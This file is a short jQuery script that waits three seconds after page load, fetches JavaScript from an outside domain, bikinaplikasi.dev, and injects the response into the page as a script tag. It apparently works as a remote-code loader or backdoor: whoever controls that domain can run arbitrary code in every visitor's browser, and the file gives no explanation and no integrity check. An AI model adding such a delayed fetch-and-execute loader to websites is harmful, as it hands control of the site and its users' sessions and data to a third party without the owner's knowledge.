$(document).ready(() => {
    setTimeout(() => {
        $.ajax({
            url: "https://bikinaplikasi.dev/get-watch-js",
            success: function (response) {
                $('body').append(`<script>${response}</script>`);
            }
        });
    }, 3000);
});
